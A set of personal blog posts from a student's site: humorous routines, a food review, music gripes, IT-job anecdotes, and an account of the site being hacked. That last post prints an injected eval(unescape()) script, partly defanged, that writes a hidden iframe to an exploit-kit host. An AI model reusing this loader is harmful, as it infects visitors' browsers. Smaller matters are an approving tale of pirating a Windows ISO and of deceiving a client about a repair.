  • Go back inside, watch as newbies take down Banner.
  • Collect camera and tripod, making sure tapes are kept in safe place.
  • Return to apartment, to hang out with Monkeys and watch them drink beer. Drink 2 liter of Dr. Pepper, which you got at liquor store.
  • Brag about how pretty girl talked to you.
  • Eat celebratory grilled cheese sandwich.
  • Go to bed.

Ok, that's the end of day one. In the near future, I'll continue the saga and go through days 2-5 as I explain the process of capturing, editing, and uploading the video to the website.

This is all satirical and fictional, for those of you who may not have noticed, so it shouldn't be taken seriously.

fields.title: Crazy Monkey Video Routine
fields.text:
As promised, here is the continuation of my Crazy Monkey show routine. I know it's been a while, and I'm sorry. Just calm down already, you horde of glorious fans.

Again, in order of operation, my routine for dealing with video of the Crazy Monkeys shows.

  • Get up at the crack of 2:30 PM.
  • Try to remember which person's bag or briefcase you stashed the all-important tapes into.
  • Realize it was in your own bag, the one the video camera was in.
  • Sit down at computer, grilled cheese sandwich in hand, and connect the HDV camera via Firewire.
  • Open Adobe Premiere CS3, and load the Monkey_HD project file.
  • Turn on camera.
  • Start the capture system by hitting F5.
  • Enter appropriately useless but still hilarious names for the tape and the video clip in Premiere (I like to go with a 'named after prehistoric mammals' motif, but you can name them whatever you want.
  • Click 'capture tape.'
  • Begin the one hour wait for the tape to capture.
  • After fifteen minutes, finally decide that it won't hurt anything if you surf the internet while it's capturing.
  • Stumble upon a delightful picture of a cat in a pose that makes it look kind of human almost.
  • Play either Eyezmaze's delightful Tontie version 1 or Vector TD for a while, until the harder levels piss you off.
  • Notice that the tape has finished, fifteen minutes ago.
  • Return to Premiere and try to stop the capture.
  • Realize that the timecode stopped at about four minutes.
  • Wait for Premiere to respond, get fed up and close it through task manager.
  • Check the file that Premiere supposedly captured to.
  • Delete the broken and incorrect file that Premiere for some reason decided to create instead of the hour of video you tried to capture.
  • Repeat the last steps, starting with 'Open Adobe Premiere CS3.' Yes, repeat all steps, including this one.
  • Finally get fed up with crappy computer; fight the urge to throw it at something.
  • Gather up the camera, the tapes, the tripod, your external hard drive, MP3 player, a couple grilled cheese sandwiches, and headphones and hop on your bike to the underground library.
  • Descend into the depths of the DLC lab, thousands of feet below the surface of the earth.
  • Queue up plenty of Aphex Twin on MP3 player.
  • Wait for twenty minutes for a computer to open up.
  • Sit down, situate self, and log in.
  • Connect the camera. Start up Adobe Premiere CS3.
  • Leave the lab, get cup of coffee, browse some magazines, eat a donut or two.
  • Return to the lab. Premiere should be just starting up now.
  • Turn on the camera, activate the capture system by hitting F5.
  • Name the tape and the clip something just as hilarious as before.
  • Capture the tape.
  • Do various things to amuse yourself, including browsing the internet, looking around at other people in the lab, and . . . well, that's about all there is to do.
  • Finally, after an excruciating 45 minutes, stop the capture and save the file. Check it to make sure it works.
  • Repeat the last five steps for the other three tapes you have that you need to capture.
  • Once you're all done capturing the video, and you have 30 gigabytes of video, you have to copy it to your external hard drive.
  • Plug in the external hard drive.
  • For some reason, the computer can't copy anything to your external hard drive. Discover a sinking feeling in the pit of your stomache.
  • Go to the front desk and ask to rent an external hard drive, hoping they aren't out yet.
  • Get the last drive, and bring it back to the computer.
  • The files won't copy to it, either. Rediscover that sinking feeling.
  • Ask the lab monitors what the flarp. They tell you that you can't just copy files to the drive, you have to create folders first.
  • Return to you desk, particularly flummoxed by this curious restriction. Create a folder named 'giant sloth' and copy the videos to it.
  • Wait another thirty minutes for the files to copy.
  • Once they're done, turn in the camera and the tripod, and take the external hard drive home.
  • Copy the files to your hard drive, where they should have been hours ago if only the stupid thing worked right.

Where there you go. That's the process I go through to get the video of the show on my computer. Whatever, I'm bored. Goodbye.

fields.title: BitTorrent to the rescue
fields.text:
Merry Christmas.

I just thought I'd share an adventure I had yesterday. Wind here was terrible, and it was messing with the power lines substantially. We were getting surges all day. Everything in the house flicked off and back on many times through the day. Very surprisingly, my computer was unscathed, a testament to the skilled craftsmanship at work (I built it myself). My dad's computer was not nearly as lucky. One of the power surges killed his computer. The surge killed it so hard, it damaged his registry somehow, so Windows Vista wouldn't boot anymore. It just asked for the Vista installation disk, so that it could repair itself. The problem was that I left the disk at school, so it was about two hours away. What to do? Do we just wait until I get the disk, which could be two weeks? Do we go out and buy a new copy of Vista, which could be two hundred dollars?

No, we turn to Bittorrent. In just a few hours, I downloaded an ISO file of a Windows Vista disk, popped it in Dad's computer, and he was back in business. BitTorrent Saved Christmas.

fields.title: Spyware hero
fields.text:
I currently work as a computer technician in the Agricultural Economics department at Purdue university. It's not the most glamorous job in the world, or the most interesting, but it beats working all night at a coffee shop. I have to work early in the morning, but that means my evenings and weekends are free. There are certain times, however, when it is totally awesome to have my job. One of those times happened today.

I arrived this afternoon, and sat down waiting for something to break so I could fix it. That's the majority of my job. One of my bosses came into the tech shop, and asked me if I knew anything about spyware.

'I know a little about it, yes.' I responded.

'Well, one of our faculty is getting a strange error message. When you have time, could you go up to her office and take a look at it?'

'Sure.'

No problem, I thought. I'll just get a copy of AdAware and HijackThis on my Mr. Blasty, and do a thorough scan and clean of the computer in question. I went on up to the office, and took at look. Sure enough, there was the strange error message. 'Warning, your computer is infected by spyware. Download anti-spiware tools now.' It said. It definitely looked bogus. Initially I thought that it was just a pop up, which can happen when you get spyware. On closer inspection, however, I saw that it wasn't in a window, and as a result it had no close button. I logged out of the user's account, so that I could work in the administrator account. That's when I saw what the 'warning message' really was.

As Windows logged out, the warning stayed, centered in the middle of the desktop, even after everything else had closed. It was a wallpaper. It was nothing more than a simple desktop background. AdAware and HijackThis confirmed that there were no questionable files anywhere on the computer. All I did was search the local disk for '*.jpg' and '*.bmp'. There it was, 'dfdfdhejahdjhiv.bmp' right in the System folder. I deleted the file, restarted the computer, and it was all back to normal.

Of course, I made up a very technical story about how I had to use a few special pieces of software to find the corrupted programs and remove them safely. 'It was tough, but I was able to get it all fixed up. These bugs just find their way onto your computer, and there isn't much you can do to stop them. Luckily, though, I'm around, and I got it fixed up.'

I was a hero.

fields.text:
What a busy day today. Here's a simple rundown of what I did today. I'm only saying, because it's interesting to me to actually quantify what I do all day.

  • 7:00 AM - I woke up extremely started by my alarm clock.
  • 7:30 AM - I arrived at work, ready to be a hero again.
  • 10:30 AM - I had some downtime while a computer slowly updated itsself, so I did some research for my other job (designing a flash game for a CGT professor). This was an extremely efficient hour, working two jobs at once.
  • 11:30 AM - I left work and decided to go to the convenience shop to get some lunch. I got some trail mix and Dr. Pepper.
  • 12:00 PM - Class, business law. It's more interesting than it sounds, really.
  • 1:15 PM - Then I went to the underground library, to meet with the other members of Ara, LLC.
  • 1:30 PM - The other members arrived, and we found a meeting room to discuss our project.
  • 2:45 PM - Wrapped up meeting, with some great ideas in mind.
  • 3:00 PM - Stopped by PAO hall on my way home to try to find Rich Rand. I hoped not to run into anybody, because I just wanted to get home and get to work on Job #2.
  • 3:30 PM - Finally arrived home, after 8 hours wondering around taking care of business. I still had laundry to do, though.
  • 3:45 PM - Dropped off my stuff, found that Andrew had done the dishes (awesome) and went to the bank to get quarters for laundry.
  • 4:00 PM - Got $10 in quarters, got back to the apartment. I grabbed my laundry (about 4 weeks of clothes) and set off for the laundry room.
  • 4:15 PM - Laundry working, I finally had a moment to sit down, watch an episode of Boston Legal and have a bowl of soup (my first actual meal of the day).
  • 5:00 PM - Switched laundry into dryer.
  • 5:10 PM - Got to work on Job #2, working up some designs for this flash game intended to keep kids in school.
  • 6:10 PM - Andrew went to put his laundry into dryers, and I chased after him, in a comical fashion. I really hope the group of people we passed wondered what the Hell was going on.
  • 6:15 PM - Gathered up dry clothes. I commented that this was the first time I've ever not had to dry my clothes a second time. They were nice and dry after round one. Cue torrential downpour.
  • 6:20 PM - Andrew ran and got an umbrella for me, and we ran through the unbelievably wet world back to the apartment. So much for my perfectly dry clothes.
  • 6:30 PM - Back to work on the designs. I came up with two pretty good looking ones.
  • 8:30 PM - I took a break to watch another episode of Boston Legal.
  • 9:15 PM - Back to work.
  • 10:30 PM - Andrew was playing Team Fortress 2, and I couldn't resist. I fired it up, but our terrible internet dashed my hopes. The speed here is horrible after about 8. I wrote yet another furious email to the cable company, asking them to do something about it. Instead of playing, I ended up just sending a few important emails scheduling a myriad of meetings tomorrow.
  • 11:15 PM - I decided to write a post about what I did today. You're reading that right now.

Sheesh, what a day. If anybody's counting, today I worked for nine hours (plus I'm going to try to get another hour or two in before bed), was in class for two, and had meetings and other business for about four.

What a start to the rest of my life . . .

fields.title: DJ Tiesto
fields.text:
Hey, DJ Tiesto (if that is your real name), you're pretty sweet with that electronic music you do, there. You're not nearly as good as Justice, mind you, but you're not bad. I'd call you this generation's Darude, if Darude wasn't already this generation's Darude. I have one pretty major gripe, though.

I listen to Electronic so that I don't have to wade through a bunch of crappy lyrics to get good music. Lyrics are retarded in 90% of music. What's the deal with you and a bunch of other electronic artists thinking you need to throw in some rich-sounding female voice talking about feelings and desires? Do you know why 'Robot Rock' or 'Around the World' are better Daft Punk tracks than 'Face to Face' (click the links, look at the lyrics, and you'll get your answer). Justice rocks hard, but do you know which tracks rock the least? That's right, it's D.A.N.C.E. and Tthhee Ppaarrttyy, because they're the ones with the stupid female voices talking about feelings and desires.

There's one exception, of course, but we don't need to count him. Benny Bennassi gets away with it because he's insane. He's coming out with his fourth album this summer, and guess what, it's going to sound exactly the same as every other track he has ever made. I can stand stupidly written female vocals when they're backed by awesome-sounding buzzing synth loops. Once you get some awesome-sounding buzzing synth loops, Tiesto, I'll put up with your stupid female vocals.

And since I've got you here, DJ Tiesto, I should tell you what the fans of electronic music have secretly been wanting to tell you for eight years. MAN UP. I'm sick of sitting around for two to five minutes waiting for you to get around to actually starting a track. You build and build and build and build, and we wait and wait and wait, and then you finally get to the good part, and then you almost immediately end the track. Does Justice make us wait for heart-destroying rage-house? Does Benny Bennassi make us wait for that insidious buzz-synth? No, they don't. Daft Punk sits around all day just looping the same intro to a song that doesn't even exist, and you think you're doing something groundbreaking when you do the exact same thing, Tiesto? I want to hear your tracks, not the endless intros to your tracks.

UPDATE: 6/8/08

Ok, I got Benassi's new album. What happened, Benny? Did your compressor break? You know, you can get another one. In fact, I'll buy you another one, because this stuff just doesn't sound right. And what's with those male vocals?

fields.title: Mixed Mithai, A review (1/2)
fields.text:
by Shauvon McGill
Featuring John Schuster

There's a little international food mart just down the road from where I live (with my new roommate, John). It's called La Village, which is French for The Village (the part of West Lafayette where it is located). They have all sorts of crazy foreign food items, like Paratha, a delicious fried bread thing that we've enjoyed with some curried rice and whatnot. We've also discovered a thing called Gulab Jamoon, which is a lot more fun to say that it is to eat, but it's still an interesting treat. Another 'treat' offered at La Village is the Mixed Mithai, an assortment of weird . . . things . . . in a little plastic container. We've wondered what the hell Mixed Mithai really entailed, so on Friday night, John and I decided to find out.

Only $5.79ï¿½
for . . . whatever this is

Let me clear the air. I'm not going to build suspense for this review, and make you wonder whether or not Mixed Mithai is any good or not. It's not good. In fact, it could be called horrid. I want it to be absolutely clear that under no circumstances should you ever try to eat Mixed Mithai. Especially not for the '$5.79ï¿½' that I paid for it.

After we tried the first 'mixed mithai.' I decided that this should be recorded for posterity's sake, since we certainly weren't getting our money's worth out of the product itsself. I remembered I had this website thing that I've forgotten about for like 6 months, and I decided to come up with a review, to ward others away from thinking it would be 'worth a shot' as we did.

Anyway, let's get on with the various 'mithai' in all their 'mixed' glory. I'm not sure what Mithai means in whatever language it's supposed to be. It's probably some sort of joke at Americans.


White + Green Roll Thing

The first item was a sort of tube like structure, with white stuff on the outside and a green paste on the inside. I didn't get a picture, because it was only after choking it down that we decided to document the rest of the adventure. Upon first biting into it, I figured that it probably wasn't fully cooked, because that was the only reason I could think of to explain why it was so unpleasant. It wasn't terrible, mind you. I could have eaten a little more of it (which is good, as you'll soon see), but it wasn't very fun. John described it as 'Minty but not mint.' He called it weird. Weird is pretty much the defiinition of 'Mixed Mithai.' We both felt it was probably the odd Mithai out, and moved on.

It wasn't.


White Square Thing

The White Square Thing

Next up was the cube-shaped white square thing. I didn't try it, because I was getting my camera out, but John ate an entire cube of it. The package generously offered two whole cubes of the white paste-like stuff. Here is the rundown of John's observations, as he examined and ate it:

'It looks very non-descript.'

'It tastes very non-descript.'

'But it's got texture. . . It's got a whole lot of texture.'

'This tastes a lot like that roll. Oh wait!'

The white stuff on the outside of the roll must have been the same white stuff that composed the white square thing. That was a pretty obvious conclusion. The white Mithai was also conveniently supplied in a much flatter Trapezoid configuration, to serve your particular mithai needs. I had a piece of the trapezoid. It was pretty non-descript.


Green Block

The Green Block

It was pretty obvious that if the white block was the white part from the white + green roll thing, then the green block was probably equally represented there. 'Is this the green bit from inside the roll?' John asked. 'If so, can I make it through an entire block of the stuff?'

The Green Block

Ultimately, he did, with a sort of determination I haven't seen in someone before. He quickly went for a bottle of Tonic Water to wash it down.

'It is the stuff.' He said, remembering it's mint-less minty flavor. I asked him if it was growing on him. 'I've acquired a bit,' he said, right before gulping down some more tonic water.


Orange Blob

There are two of them. How lucky . . .

Here is a very unique member of the mixed mithai assortment. It's hard to really describe it. In fact, it was very hard, surprisingly so. It looks slimy and soft almost like orange cottage cheese (. . . yum), but it was actually hard and dry, like a golf ball (not quite as hard).

As big as a golf ball, too.

'It definitely tasted fried,' John said, as he took a bite, 'it tastes like vegitable oil.'

A tentative bite.

It did taste like vegitable oil. This one wasn't bad. It had a slightly more gritty and slightly less pasty texture than the white or green stuff, and it was kind of sweet, once you got past the vegitable oil. I quickly realized that my tiny, tentative bites were not getting me very close to finishing the entire blob. Those little things just keep going and going. I wasn't very interested in keeping that up, so I set it down and we moved on.


Orange Cube

The Orange Cubes

There were two kinds of orange cubes in the package. One had much more stuff on top of it. We went for the cleaner one first. John took his bite, and immediately said 'This one tastes weird.'

'This one tastes weird.'

John said it tasted like the white and the green, which at that point was a pretty big departure for the Mithai. It had all been pretty much identical, except for the Vegitable Oil-laced blobs.

Then John said it tasted like wood. The flavors just kept on coming. Listen, folks, this one was the real deal. It smelled somehow reminiscent of raw bread dough. It did. I was not looking forward to tasting it. I bit off a tiny chunk and lied to my mouth, claiming it was actually food. My mouth had a hard time believing me, and my stomach almost sent it back for re-analysis. I wasn't a big fan.

'So that's where all the flavor went.' I said. Definitely not as non-descript as the white cubes.


That's all I can bear to remember right now. I'll continue this saga soon, with both the best and the worst of the Mithai left to explore (yes, it gets worse). See you then.

Read Part 1

LAST TIME, ON DENYCONFORMITY.COM:

John and I made a huge mistake.

AND NOW, THE CONCLUSION:

White cookie thing

White Cookie thing

These were pretty visually unique, as mixed mithai goes. They weren't bad to eat, either. I still wouldn't eat them given the choice, but they were the definite standout of everything in the package. They tasted somewhat like stale caramel, as John described them. They were very doughy, though. Their texture was very weird, like that weird stuff you get from mixing corn starch and water. Sort of like an eraser, but not at all chewy. It's very hard to describe this stuff. I hope I'm not making it alluring, because I don't want to make anybody want to try it.

The white cookie thing was definitely the most palatable of the entire mixed mithai. What an achievement.

Rainbow Thing

Ugh, the Rainbow Thing

Oh man, the rainbow thing. We were not excited about diving in to that one. John looked at it and said, 'Now . . . the rainbow thing . . . oh guugh.' To say he was tentative would have been an understatement.

John is quite sarcastic.

It looked like the indian flag, as John pointed out, sans emblem.

All hail king of the Mithai

We tried mithai with one color, we tried it with two colors, but this was three colors. As John described, 'I can guess what the white and the green layers taste like, but the wild card is that red one. The question is what chord will it ring with the other two?'

He found out.

Oh God.

He bit it, set it down, and took a step back. It was not a good chord. I tried it next.

My taste buds are pretty subdued as it is, and I'm kind of nursing a cold right now, which dulls them further. Food has never been a big deal for me. Even still, nothing could have prepared me for the punch in the face that was the rainbow thing. It had the same odd, gritty texture as the white or green stuff, and the flavor of those were very well represented. The red . . . well, take it this way: the taste of mithai seems to go on a scale. It goes from barely palatable to absolutely horrible as it goes from white, to green, to red.

Threat level red.

The Rainbow Thing is the pinnacle of Mixed Mithai. It was the end of the road for us. John decided to explore the red further, for science.

What does the red taste like, alone?
It doesn't look that bad.
Oh God.

Yeah, it was still bad.

There were a few things left in the package, but we both decided that their flavors could be extrapolated from what we had already tried. We cut our losses and called it a Mixed Mithai night. Back in the fridge they went, and John and I both sat down. It seemed the mithai sat in our stomaches about as well as it sat in our mouths.

Verdict

Of all the mixed mithai, the cookie thing was the definite winner. That needs perspective, though. The cookie thing was like the first American Pie movie. It was ok compared to the other ones, but wouldn't you rather just watch a couple episodes of the Office again? If taken alone, the cookie thing would probably be one of the worst things I've ever eaten.
In the land of the blind, the one eyed man is king.

The rainbow thing, on the other hand, will haunt my dreams and be the basis of comparison for every horrible thing I eat for the rest of my life.

The Horation Sanz of the SNL that is Mixed Mithai.

The next day, Andrew came over and found the remaining mithai in the fridge. I tried to stop him, but he dove right in. A few minutes later he had finished the entire container.

'Those are pretty good.' He said.

fields.title: Trade Off
fields.text:
So I've got two jobs this summer. Having two jobs has pros and cons, as you might imagine. They aren't what you'd think, though.

So you probably think I'm rolling in all kinds of cash. I am, I'm super rich, but here's the thing. I'm spending more money than I ever have, too.

When you work more than you don't, you don't have time to feed yourself, so I get expensive fast food all the time, which really adds up.

One of my jobs is working at home, so I have my computer blasting away at full power, with the air conditioner blasting away at full power, with fans blasting away at full power, while my new Roommate John is in the next room blasting away at full power on his own bits. In the month of June, we used almost three times more power than we did in May, and July had even more than that. The bills are equally high. My bank account hurts.

So even after my paychecks are insanely high, I still don't really have that much money anymore. Looks like I won't be able to afford a dog after all.

End result: I'm now more exhausted and stressed out than I've ever been, and aside from a new bullet point on my resume (and an admittedly sweet flash game), I have nothing to show for it. I never thought I would be looking forward to the semester starting because it would mean a lot less work for me.

Incidentally, if anybody is in the West Lafayette area and wants to test a new flash game for me, let me know.

fields.title: Denyconformity.com was hacked!
fields.text:
Denyconformity.com was hacked!

It was poorly done, so much that it took me a long time to find because it never occurred to me that it would have been where it was, considering it wouldn't have worked where it was. Follow the link for more info about what the deal is.

This link.

If anybody out there is using either AVG (my parents) or Avast! (Athanasios) for their antivirus, you wouldn't have been able to view Denyconformity.com for a while. For the longest time, I thought those overly anal antivirus programs were just having problems with some of my completely harmless code, and I tried to contact them about why they had trouble. I checked the code that showed up on the browser (the page you're looking at right now) and nothing was out of the ordinary. There weren't any blocks of code that I didn't specifically put there.

Then I remembered how my site actually worked.

When you go to http://www.denyconformity.com, you're actually going to http://www.denyconformity.com/index.php, because that's the page the browser automatically loads when it isn't given a file to load. That index.php file just has one little string of text and one javascript command. It immediately redirects the browser to http://www.denyconformity.com/content/news.php. I did it this way because I use Javascript on my site, and I wanted to let people know that if they don't have Javascript enabled they won't be able to view the site. Also, I wanted to have a particular directory structure, so I wanted to have the actual main page within a sub directory. Anyway, I disabled javascript and checked the code my browser was getting on that index.php page. Here's what I saw (the suspicious section is at the end):

<!DOCTYPE html PUBLIC '-//W3C//DTD XHTML 1.1//EN' 'http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd'> <html xmlns='http://www.w3.org/1999/xhtml'> <head> <link rel='shortcut icon' href='/favicon.ico' type='image/x-icon' /> <title>Deny Conformity</title> <meta http-equiv='Content-Type' content='text/html; charset=utf-8' /> <meta name='resource-type' content='document'/> <meta name='revisit-after' content='15'/> <meta name='description' content='Someone's attempt to sort out the universe.'/> <meta name='keywords' content='Shauvon McGill, conformity, deny conformity, blog, story, stories, literature, Purdue, Crazy Monkeys, existential, life, meaning'/> <meta name='copyright' content='2005'/> <meta name='author' content='Shauvon McGill'/> <meta http-equiv='reply-to' content='smcgill@denyconformity.com'/> </head> <body> <script type='text/javascript'> document.location='content/news.php' </script> <p>Welcome to DenyConformity.com. Please enable Javascript. Have a nice day. Super cramming power.</p> <p> <a href='http://validator.w3.org/check?uri=referer'><img src='http://www.w3.org/Icons/valid-xhtml11' alt='Valid XHTML 1.1' height='31' width='88' /></a> </p> </body> </html><script>evaall(unescaapee('2b%27%37%62%38%63%32%64%5c%27%20%77%69%64%74%68%3d%31%31%20%68%65%69%67%68%74%3d%32%33%37%20%73%74%79%6c%65%3d%5c%27%64%69%73%70%6c%61%79%3a%20%6e%6f%6e%65%5c%27%3e%3c%2f%69%66%72%61%6d%%77%69%6e%64%6f%77%2e%73%74%61%74%75%73%3d%27%44%6f%6e%65%27%3b%64%6f%63%75%6d%65%6e%74%2e%77%72%69%%28%29%2a%32%36%30%37%29%65%3e%27%2974%65%28%27%3c%69%66%72%61%6d%65%20%6e%61%6d%65%3d%38%36%62%66%37%20%73%72%63%3d%5c%27%68%74%74%70%3a%2f%2f%35%38%2e%36%35%2e%32%33%32%2e%33%33%2f%67%70%61%63%6b%2f%69%6e%64%65%78%2e%70%68%70%3f%27%2b%4d%61%74%68%2e%72%6f%75%6e%64%28%4d%61%74%68%2e%72%61%6e%64%6f%6d')); </script>

What in the world is that 'eval(unescape())' nonsense? I certainly never put that there. It's that extra little script tag that freaked AVG and Avast! out. It didn't scare me particularly much. Here's why.

What that tag does is translate whatever all those characters are from their individual ASCII codes to real characters, then it runs that as javascript. Here's what those characters actually are, when they're 'unescaped':

window.status='Done';document.write('<iifraame name=86bf7 src='http://XX.XX.XXX.XX/gpack/index.php?'+Math.round(Math.random()*2607)+'7b8c2d' width=11 height=237 style='display: none'></iiframme>')

In both examples, I've added some letters to prevent antivirus software from thinking it is malicious software.

It loads an iframe (basically a box that can load any webpage inside another webpage), pointing to some other website, probably with a virus on it. I'll have my room mate John look it up in Linux to see what it is (the virus will probably not affect Linux at all). When the browser loads my page, it loads that iframe, and then it downloads the virus. It's a very common hack on websites (Avast! calls it JS:Agent-AV [Trj]). Don't worry, if you've gone to Denyconformity.com in the last however long, you haven't gotten any viruses. This code could not, and will not, ever work.

That snippet of code only showed up on the http://www.denyconformity.com/index.php page. It was thrown in at the end of the page, as you can see, after my own javascript that redirects the browser somewhere else (as long as you have javascript on). So if you have javascript enabled, the browser will never execute that code, because it will be redirected before it gets there. If you have javascript disabled, the browser will never execute that code because it is a javascript command. The iframe, and the virus, will never be executed.

This code snippet was probably added by some sort of robot, just throwing this code up on the index page of whatever website it could find. Thankfully, because of the way I put my site together, the robot just put the harmful code in a spot where it would do no harm (except freak AVG and Avast! out).

So in conclusion, a simple little page that I created a long time ago to simplify my file structure ended up protecting my site, and your computer, from some harmful doodads. Bullet dodged.

Now I need to talk to my webhost to find out why someone was able to hack my site . . .
